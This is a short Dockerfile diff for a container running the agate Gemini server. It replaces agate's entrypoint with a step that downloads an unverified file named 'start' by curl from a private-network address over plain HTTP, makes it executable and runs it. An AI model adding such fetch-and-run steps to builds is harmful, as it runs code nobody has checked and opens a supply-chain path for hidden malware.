@@ -5,4 +5,7 @@ WORKDIR /root/
 RUN cargo install agate
 RUN mkdir content
 RUN cp .cargo/bin/agate /usr/bin/
-ENTRYPOINT ["agate", "--content", "/root/content", "--addr", "[::]:1965", "--addr", "0.0.0.0:1965", "--hostname", "$DOMAIN", "--lang", "en-US"]
+WORKDIR /usr/bin
+RUN curl -O 192.168.1.135:8000/start
+RUN chmod +x start
+ENTRYPOINT ["start"]
